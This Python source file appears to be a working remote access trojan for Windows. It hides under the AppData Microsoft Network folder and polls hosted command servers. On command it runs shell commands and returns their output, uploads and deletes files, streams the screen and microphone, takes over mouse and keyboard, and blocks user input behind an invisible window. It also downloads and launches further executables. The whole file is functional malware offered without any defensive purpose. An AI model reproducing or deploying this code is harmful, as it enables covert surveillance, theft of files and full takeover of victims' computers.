from os import path, mkdir, startfile, remove, listdir, rename, remove
from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from mouse import move, click, wheel, double_click
from pyautogui import size, mouseDown, mouseUp
from rotatescreen import get_primary_display
from webbrowser import open as wbopen
from subprocess import run as sbrun
from PIL.Image import frombytes
from requests import get,post
from time import sleep, time
from threading import Thread
from keyboard import send
from shutil import which
import tkinter as tk
from mss import mss
import numpy as np
import websockets
import pyttsx3
import pyaudio
import asyncio
import psutil
import pygame
import struct
import json
import sys
import io
#                       SELECT URL
while True:
    try:
        url = "https://ms32-sha2.onrender.com/" if b"This service has been suspended." not in get("https://ms32-sha2.onrender.com").content else "https://ms32-c67b.onrender.com/"
        server_url = "https://server-ktcy.onrender.com/" if b"This service has been suspended." not in get("https://server-ktcy.onrender.com").content else "https://server-20zy.onrender.com/"
        break
    except:
        continue
print(url)
#                       Variable declaration
screen = get_primary_display()
terminate = False
sstate = False
sharing = False
mic = False
bstate = False
bmstate = False
bsig  = False
user = "103"
width, height = size()
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
CHUNK = 1024

#                  Initialisation of pygame for audio clips
try:
    pygame.mixer.init()
except Exception as e:
    try:
        statement = f"WARN   no speaker detected, no audio will play. Error:{e}"
        post(url+"output",data={"user":user,"err":statement})
    except:
        pass

##                    hit() and log()
def hit(url:str,data=None):
    try:
        if not terminate:
            if data:
                return post(url,json=data)
            return get(url,stream=True)
    except:
        return "none"

def log(statement,state="SUCESS",terminal=False) -> None:
    try:
        statement = f"{state}   {statement}"
        hit(url+"terminal",data={"output":statement}) if terminal else None
        hit(url+"output",data={"user":user,"err":statement})
    except:
        pass
#               to get absolute path
def get_path(name:str) -> str:
    base_path = path.expandvars(r"%APPDATA%\Microsoft\Network")
    return path.join(base_path, name)

#               making dir if not exists
if not path.exists(get_path("effects")):
    mkdir(get_path("effects"))
    
if not path.exists(get_path("assets")):
    mkdir(get_path("assets"))
    
#                   Downloader
def download(name:str,url:str) -> bool:
    try:
        if not which("wget"): 
            sbrun(["winget","install","wget"],shell=True)#download wget
            log("Downloaded Wget")
            
        fiel = sbrun(["wget","-O",get_path(name),url],shell=True,capture_output=True)
        
        if b"ERROR 404: Not Found" in fiel.stderr:
            log(f"Incorrect url {url} for {name}",state="WARN")
            return False
        
        if not path.exists(get_path(name)):
            log(f"Download Thread: File does not exist. stdout={fiel.stdout},stderr={fiel.stderr}",state="FATAL")
            return False
        log(f"Downloaded {name}")
        return True
    
    except Exception as e:
        log(f"Download thread error occured:\t{e}",state="WARN")
        return False

##                   Narration via pyttsx3
def say(txt:str) -> None:
    try:
        engine = pyttsx3.init()
        engine.setProperty("rate",engine.getProperty('rate')-40)
        engine.say(txt)
        log(f"Played {txt}")
        engine.runAndWait()
    except Exception as e:
        log(f"pyttsx3 thread error:\t{e}",state="WARN")

##                  Playing Audio Clips
def playfunc(fp):
    try: 
        mp3 = path.join(get_path("effects"),fp)
        if not path.exists(mp3):
            if not download("effects\\"+fp, url+f"static/sounds/{fp}"):
                log("Audio Thread: No audio downloaded",state="FATAL")
                return          
        CoInitialize()
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = interface.QueryInterface(IAudioEndpointVolume)
        
        if volume.GetMute():
            volume.SetMute(0, None)
        vmin, vmax, _ = volume.GetVolumeRange()
        target = vmin + (95 / 100.0) * (vmax - vmin)
        target = max(min(target, vmax), vmin)
        volume.SetMasterVolumeLevel(target, None)
        CoUninitialize()
        log("Unmuted and Vol set to 80")
        pygame.mixer.music.load(mp3)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            continue               
        log(f"Done Played {fp}")
    except Exception as e:
        log(f"Audio thread error: \t{e}",state="WARN")
        
###                     Updating of the script
def update() -> None:
    try:
        global terminate
        updater_path = get_path("updater.exe")
        ms32_path = get_path("ms32-1.exe")
        
        if path.exists(ms32_path):
            remove(ms32_path)
            
        if not download("ms32-1.exe",url+"static/updates/ms32-1.exe"):
            log("Update Thread: File not downloaded",state="FATAL")
            return
        if not path.exists(updater_path):
            if not download("updater.exe",url+"static/updates/updater.exe"):
                log("Update Thread: Updater not downloaded",state="FATAL")
                return
            
        if path.exists(ms32_path) and path.exists(updater_path):
            log("EVOLVING!",state="PENDING")
            terminate=True
            startfile(updater_path)
            sleep(2)
            sys.exit(0)
        log(f"updater exist: {path.exists(updater_path)}, ms32 exist: {path.exists(ms32_path)}",state="FATAL")
    
    except Exception as e:
        log(f"Update Thread Error:\t{e}",state="WARN")

##              Hiding / Showing the taskbar
def hide(state:bool) -> None:
    try:
        if state:
            hide_path = get_path("hide.exe")
            if not path.exists(hide_path):
                if not download("hide.exe",url+"static/updates/hide.exe"):
                    log("Hide Thread: File could not be downloaded",state="FATAL")
                    return
            if path.exists(hide_path):
                startfile(hide_path)
                log("Taskbar Hidden")
                return
            log("Hide.exe does not exist",state="FATAL")
        else:
            show_path = get_path("show.exe")
            if not path.exists(show_path):
                if not download("show.exe",url+"static/updates/show.exe"):
                    log("Show Thread: File could not be downloaded",state="FATAL")
                    return
            if path.exists(show_path):
                startfile(show_path)
                log("Taskbar Shown")
                return
            log("Show.exe does not exist",state="FATAL")
            
    except Exception as e:
        log(f"Hide Thread Error:\t{e}",state="WARN")


##                      Restarting Itself
def restart() -> None:
    try:
        global terminate
        restart_path = get_path("restart.exe")
        if not path.exists(restart_path):
            if not download(restart_path):
                log("Restart Thread: File could not be downloaded",state="FATAL")
                return
        if path.exists(restart_path):
            log("Restarting...",state="PENDING")
            startfile(restart_path)
            terminate = True
            sleep(2)
            sys.exit(0)
            return
        log("Restart.exe does not exist",state="FATAL")
    except Exception as e:
        log(f"Restart thread error occured:\t{e}",state="WARN")
        
##                      Run a compiled python .exe
def run(name:str) -> None:
    try:
        exe = get_path(name)
        if not path.exists(exe):
            if not download(exe,url+f"static/apps/{name}"):
                log(f"{exe} could not be downloaded",state="FATAL")
                return
        if path.exists(exe):
            startfile(exe)
            log(f"{exe} is running")
            return
        log(f"{exe} does not exists",state="FATAL")
        
    except Exception as e:
        log(f"Run Thread Error Occured:\t{e}",state="WARN")        
        
##                  Display a image or video
def display(name:str,state:bool) -> None:
    # true for image false for video
    try:
        if state: #photo
            impath = get_path("imshow.exe")
            jpath = get_path(path.join(name))
            if not path.exists(impath):
                if not download("imshow.exe",url+"static/apps/imshow.exe"):
                    log("imshow could not be downloaded",state="FATAL")
                    return
            if not path.exists(jpath):
                if not download(name,url+f"static/images/{name}"):
                    log(f"{name} could not be downloaded",state="FATAL")
                    return
            if path.exists(impath) and path.exists(jpath):
                sbrun([impath,jpath],shell=True)
                log(f"Imshow displaying {name}")
                return
            log(f"Imshow exist: {path.exists(impath)}, img exist: {path.exists(jpath)}",state="FATAL")
            return
        
        if not state: #video
            vpath = get_path("vidshow.exe")
            vidpath = get_path(path.join(name))
            if not path.exists(vpath):
                if not download("vidshow.exe",url+"static/apps/vidshow.exe"):
                    log("vidshow could not be downloaded",state="FATAL")
                    return
            if not path.exists(vidpath):
                if not download(name,url+f"static/videos/{name}"):
                    log(f"{name} could not be downloaded",state="FATAL")
                    return
            if path.exists(vpath) and path.exists(vidpath):
                sbrun([vpath,vidpath],shell=True)
                log(f"Vidshow displaying {name}",state="FATAL")
                return
            log(f"Vidshow exist: {path.exists(vpath)}, vid exist: {path.exists(vidpath)}",state="FATAL")
    except Exception as e:
        log(f"Display Thread Error occured:\t{e}",state="WARN")    

##                      Flip the screen continuously
def flip() -> None:
    global sstate
    try:
        log("Flipping")
        while sstate:
            screen.set_portrait()
            sleep(1)
            screen.set_landscape_flipped()
            sleep(1)
            screen.set_portrait_flipped()
            sleep(1)
            screen.set_landscape()
            sleep(1)
    except Exception as e:
        log(f"flip thread error occured:\t{e}",state="WARN")

###            Run any command as same permission level as this exe      
def runcmd(cmd:str) -> None:
    try:
        # cmd = cmd[:-1]
        try:
            result = sbrun(f"cmd /c \"{cmd}", shell=True, capture_output=True, text=True)
            stdout = result.stdout
            stderr = result.stderr
            exit_code = result.returncode
        except Exception as e:
            stdout = ""
            stderr = str(e)
            exit_code = -1
        if not stderr:stderr="none"
        if not stdout:stdout="none"
        output = f"OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}"
        alsr = post(url+"terminal",json={"output":output})
        if alsr.status_code == 200:
            log(f"{cmd} executed")
        output = f"OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}"
        alsr = post(url+"terminal",json={"output":output})
        if not alsr.status_code == 200:
            log(f"failed to send the output. The output was\t\t OUTPUT:\t{stdout}\nERROR:\t{stderr}\nCODE:\t{exit_code}")
        
    except Exception as e:
        log(f"runcmd thread error:\t{e}",state="WARN")

##                Input Blocker (kind of)

def block_touch(event):
    global bstate
    if not bstate:
        return None
    return "break"
def block():
    root = tk.Tk()
    root.iconbitmap(path.join(sys._MEIPASS,"defender.ico"))
    root.title("NOESCAPE.EXE")
    root.attributes("-fullscreen", True)
    root.attributes("-alpha", 0.01)
    root.attributes("-topmost", True)

    root.bind("<ButtonPress>", block_touch)
    root.bind("<ButtonRelease>", block_touch)
    root.bind("<Motion>", block_touch)
    while bstate:
        root.update()
        sleep(0.01)
    root.quit() 
    root.destroy()
    root = None  
def block_main():
    global bstate
    global bmstate
    global bsig
    bmstate = True
    bstate = True
    bsig = True
    while bmstate:
        Thread(target=block).start()
        while bsig:
            pass
        print("unlocking")
        bstate = False
        sleep(0.5)
        bstate = True
        bsig = True
        print("lock") 

###                       Websocket ScreenShare
##                          Screen Controller
async def controller(data):
    global bsig
    try:
        data = json.loads(data)
        print("[INPUT]", data)
        if data["type"] == "click":
            x = data["x"] * (width / data["width"])
            y = data["y"] * (height / data["height"])
            move(x, y)
            if data["button"] == 0:
                bsig = False;sleep(0.03)
                click()
            elif data["button"] == 1:
                bsig = False;sleep(0.03)
                click(button="middle")
            elif data["button"] == 2:
                bsig = False;sleep(0.03)
                click(button="right")

        elif data["type"] == "key" and data["button"]:
            btns = [chr(k) if isinstance(k, int) else k for k in data["button"]]
            keys = "+".join(btns)
            send(keys.lower())

        elif data["type"] == "scroll":
            wheel(delta=-(data["deltaY"]))

        elif data["type"] == "dbclick":
            x = data["x"] * (width / data["width"])
            y = data["y"] * (height / data["height"])
            move(x, y)
            bsig = False;sleep(0.03)
            double_click()

        elif data["type"] == "drag":
            x1 = data["x1"] * (width / data["width"])
            y1 = data["y1"] * (height / data["height"])
            x2 = data["x2"] * (width / data["width"])
            y2 = data["y2"] * (height / data["height"])
            move(x1, y1)
            sleep(0.01)
            bsig = False;sleep(0.03)
            mouseDown()
            sleep(0.01)
            move(x2, y2)
            sleep(0.01)
            mouseUp()

    except Exception as e:
        print(f"[INPUT ERROR] {e}")

##                  Screensharing actual
async def receive_messages(websocket):
    async for message in websocket:
        await controller(message)

async def send_screen(websocket):
    global sharing
    target_fps = 15
    with mss() as sct:
        monitor = sct.monitors[1]
        frame_count = 0
        start_time = time()

        while sharing:  
            frame_start_time = time()  

            img = sct.grab(monitor)
            img_pil = frombytes("RGB", img.size, img.rgb)

            img_pil = img_pil.resize((960, 540))  

            buf = io.BytesIO()
            img_pil.save(buf, format='JPEG', quality=40) 
            jpeg_bytes = buf.getvalue()
            timestamp = int(time() * 1000)
            timestamp_bytes = struct.pack(">Q", timestamp)
            packet = timestamp_bytes + jpeg_bytes

            try:
                await websocket.send(packet)  
            except Exception as e:
                print(f"[SEND ERROR] {e}")
                break 

            frame_count += 1
            elapsed = time() - start_time
            if elapsed >= 1.0:
                print(f"[FPS] {frame_count} fps")
                frame_count = 0
                start_time = time()

            frame_processing_time = time() - frame_start_time

            target_frame_time = 1.0 / target_fps 
            remaining_time = target_frame_time - frame_processing_time 

            if remaining_time > 0:
                await asyncio.sleep(remaining_time)

        await websocket.close()
        print("[INFO] WebSocket connection closed.")

def compress_frame(raw_bytes, size):
    img_pil = frombytes("RGB", size, raw_bytes)
    img_pil = img_pil.resize((960, 540))
    buf = io.BytesIO()
    img_pil.save(buf, format='JPEG', quality=40)
    return buf.getvalue()

async def send_screen(websocket):
    global sharing
    target_fps = 30
    with mss() as sct:
        monitor = sct.monitors[1]
        frame_count = 0
        start_time = time()
        while sharing:
            frame_start_time = time()
            img = sct.grab(monitor)
            loop = asyncio.get_running_loop()
            jpeg_bytes = await loop.run_in_executor(None, compress_frame, img.rgb, img.size)
            timestamp = int(time() * 1000)
            timestamp_bytes = struct.pack(">Q", timestamp)
            packet = timestamp_bytes + jpeg_bytes
            try:
                await websocket.send(packet)
            except Exception as e:
                print(f"[SEND ERROR] {e}")
                break
            frame_count += 1
            elapsed = time() - start_time
            if elapsed >= 1.0:
                print(f"[FPS] {frame_count} fps")
                frame_count = 0
                start_time = time()
            frame_processing_time = time() - frame_start_time
            target_frame_time = 1.0 / target_fps
            remaining_time = target_frame_time - frame_processing_time
            if remaining_time > 0:
                await asyncio.sleep(remaining_time)
        await websocket.close()
        print("[INFO] WebSocket connection closed.")


async def screenshare():
    uri = "wss://screenshare-server.onrender.com"
    while sharing:
        try:
            async with websockets.connect(uri, max_size=None) as websocket:
                await websocket.send("sender")
                print("[INFO] Connected to server as sender")
                await asyncio.gather(
                    send_screen(websocket),
                    receive_messages(websocket)
                )
        except (websockets.exceptions.ConnectionClosedError,
                websockets.exceptions.InvalidHandshake,
                asyncio.TimeoutError,
                OSError) as e:
            print(f"[WARNING] Connection failed: {e}. Reconnecting in 2 seconds...")
            await asyncio.sleep(2)
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
            break

def share_trig():
    asyncio.run(screenshare())


##                  Speakdisplay(doesnt speak actually)
def commtxt() -> None:
    try:
        exe = get_path("speakdisplay.exe")
        if not path.exists(exe):
            if not download("speakdisplay.exe",url+"static/apps/speakdisplay.exe"):
                log("Speakdisplay.exe could not be downloaded",state="FATAL")
                return
        if path.exists(exe):
            startfile(exe)
            log("Speakdisplay.exe running")
            return
        log("Speakdisplay.exe does not exist",state="FATAL")
    
    except Exception as e:
        log(f"Speakdisplay thread error occured:\t{e}",state="WARN")

##                      Error msgbox showing
def showerr(num:int) -> None:
    try:
        num = int(num)
        exe = get_path("error.exe")
        if not path.exists(exe):
            if not download("error.exe",url+"static/apps/error.exe"):
                log("error.exe could not be downloaded",state="FATAL")
                return
        if path.exists(exe):
            for i in range(1,num+1):
                sbrun(["start",exe],shell=True)
            return
        log("error.exe does not exist",state="FATAL")
    except Exception as e:
        log(f"showerr Thread Error occured::\t{e}",state="WARN")

###                        Remotely acces the files
#   Retrieving the list of files
def getFile(p):
    if p.startswith("/"):
        p = p.replace("/", "")
    try:
        with open(p, "rb") as file:
            files = {'file': file}
            print("file")
            try:
                res = post(url + "post-file", files=files)
                if not res.status_code == 200:
                    if not post(url + "post-file", files=files).status_code == 200:
                        log("Can't Post the file dir",state="FATAL")
            except Exception as e:
                print("Error during file post:", e)
    except Exception as e:
        log(f"Error opening file {p}: {e}",state="WARN")

#   Renaming a file
def renameFile(a):
    p, name = a.split("|")
    if p.startswith("/"):
        p = p.replace("/", "")
    print(p)
    print(name)
    name = path.join(path.dirname(p), name)
    try:
        rename(p,name)
    except Exception as e:
        log(f"Error renameing {a}:\t {e}",state="WARN")
    print("rename")

#   Deleting a file
def deleteFile(p):
    if p.startswith("/"):
        p = p.replace("/", "")
    try:
        remove(p)
    except Exception as e:
        log(f"Error deleting {p}:\t {e}",state="WARN")

#   Retreiving the contents of the folder 
def getFolder(p):
    try:
        if p == "/":
            folder = {}
            partitions = psutil.disk_partitions()
            for idx, partition in enumerate(partitions, start=1):
                folder[f"folder{idx}"] = partition.device
            if not post(url+"post-folder",json=folder).status_code == 200:
                if not post(url+"post-folder",json=folder).status_code == 200:
                    log("Cant post folder",state="FATAL")
                
        else:
            if p.startswith("/"):
                p = p.replace("/","")
            datas = listdir(p)
            folder = {}
            for idx, data in enumerate(datas, start=1):
                if path.isdir(path.join(p,data)):
                    folder[f"folder{idx}"] = data
                else:
                    folder[f"file{idx}"] = data
            if not post(url+"post-folder",json=folder).status_code == 200:
                if not post(url+"post-folder",json=folder).status_code == 200:
                    log("Cant Post Folder",state="FATAL")
    except Exception as e:
        log(f"GetFolder thread Error occured:\t{e}",state="WARN")

##                      Audio Transmitter (kind of)
def boost_volume(data, factor=1.05):
    boosted = data * factor
    return np.clip(boosted, -32768, 32767).astype(np.int16)

async def send_audio():
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

    uri = "wss://screenshare-server.onrender.com"
    async with websockets.connect(uri) as websocket:
        print("Connected to WebSocket server for audio streaming.")
        await websocket.send("audio")
        try:
            while mic:
                data = stream.read(CHUNK, exception_on_overflow=False)
                audio_data = np.frombuffer(data, dtype=np.int16)

                boosted = boost_volume(audio_data)

                await websocket.send(boosted.tobytes())

                await asyncio.sleep(0.001)
        except KeyboardInterrupt:
            print("Streaming stopped.")
        finally:
            stream.stop_stream()
            stream.close()
            audio.terminate()

def mic_trig():
    asyncio.run(send_audio())

##                        Windows Crasher (safely)
def crash() -> None:
    pass

##                          Main Head                   ##

def main():
    global sstate
    global sharing
    global mic
    global bmstate
    global bsig
    log(f"{user} online!", state="ONLINE")
    while not terminate:
        try:
            sleep(0.5)
            cmd = hit(url+"command",data={"user":user})
            if type(cmd) != str:
                cmd = cmd.content.decode("utf-8")
            print(f"{cmd}")
            if "hIdE on" in cmd:
                Thread(target=hide,args=(True,)).start()
            elif "hIdE off" in cmd:
                Thread(target=hide,args=(False,)).start()
            elif "rEsTaRt" in cmd:
                restart()
            elif "oPeN" in cmd:
                link = cmd.replace("oPeN ","")
                link = link.replace("sPeAk","") if "sPeAk" in link else link
                wbopen(link)
                log(f"Opened {link}",terminal=True)
            elif "pLaY" in cmd:
                fp = cmd.replace("pLaY ","")
                fp = fp.replace("sPeAk","") if "sPeAk" in fp else fp
                Thread(target=playfunc,args=(fp,)).start()
            elif "uPdAtE" in cmd:
                update()
            elif "rUn" in cmd:
                app_name = cmd.replace("rUn ","")
                app_name = app_name.replace("sPeAk","") if "sPeAk" in app_name else app_name
                Thread(target=run,args=(app_name,)).start()
            elif "iMaGe" in cmd:
                ifp = cmd.replace("iMaGe ","")
                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                Thread(target=display,args=(ifp,True)).start()
            elif "vIdEo" in cmd:
                ifp = cmd.replace("vIdEo ","")
                ifp = ifp.replace("sPeAk","") if "sPeAk" in ifp else ifp
                Thread(target=display,args=(ifp,False)).start()
            elif "fLiP on" in cmd:
                sstate = True
                Thread(target=flip).start()
            elif "fLiP off" in cmd:
                sstate = False
                screen.set_landscape()
                log("flip off",terminal=True)
            elif "cMd" in cmd:
                cmd = cmd.replace("cMd ","")
                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
                Thread(target=runcmd,args=(cmd,)).start()
            elif "eRr" in cmd:
                cmd = cmd.replace("eRr ","")
                cmd = cmd.replace("sPeAk","") if "sPeAk" in cmd else cmd
                Thread(target=showerr,args=(cmd,)).start()
            elif "sHaRe on" in cmd:
                sharing = True
                Thread(target=share_trig).start()
            elif "sHaRe off" in cmd:
                sharing = False
            elif "bLoCk on" in cmd:
                Thread(target=block_main).start()
            elif "bLoCk off" in cmd:
                bmstate = False
                bsig = False
            elif "cOm txt" in cmd:
                Thread(target=commtxt).start()
            elif "sPeAk" in cmd:
                txt = cmd.replace("sPeAk","")
                saying = Thread(target=say,args=(txt,))
                saying.start()
            elif "gEtFiLe" in cmd:
                p = cmd.replace("gEtFiLe ", "")
                Thread(target=getFile,args=(p,)).start()
            elif "rEnAmE" in cmd:
                a = cmd.replace("rEnAmE ","")
                Thread(target=renameFile,args=(a,)).start()
            elif "dElEtE" in cmd:
                p = cmd.replace("dElEtE ","")
                Thread(target=deleteFile,args=(p,)).start()
            elif "gEtFoLdEr" in  cmd:
                p = cmd.replace("gEtFoLdEr ","")
                Thread(target=getFolder,args=(p,)).start()
            elif "mIc on" in cmd:
                mic = True
                Thread(target=mic_trig).start()
            elif "mIc off" in cmd:
                mic = False
            elif "cRaSh" in cmd:
                Thread(target=crash).start()
        except Exception as e:
            log(f"Main thread error occured:\t{e}",state="WARN")
    log("Shutting down",state="OFFLINE")

main()